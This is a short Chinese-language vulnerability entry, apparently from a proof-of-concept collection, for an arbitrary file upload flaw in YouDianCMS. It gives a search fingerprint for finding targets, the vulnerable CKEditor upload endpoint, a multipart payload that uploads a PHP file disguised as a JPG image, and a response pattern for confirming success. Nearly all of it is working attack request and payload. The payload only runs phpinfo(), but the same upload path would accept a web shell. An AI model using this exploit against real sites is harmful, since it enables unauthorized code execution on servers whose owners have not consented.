# YouDianCMS友点系统任意文件上传漏洞

YouDianCMS ｜ 文件上传 ｜ —
- **指纹**：`app="友点建站-CMS"`
- **请求**：`POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1`

**Payload**
```
--cadc403efc1ad12f5fcce44c172baad2
Content-Disposition: form-data; name="files"; filename="dudesite.php"
Content-Type: image/jpg
<?php phpinfo();?>
--cadc403efc1ad12f5fcce44c172baad2--
```
- **响应特征**：200 ^(?=.*?200)(?=.*?php).*?$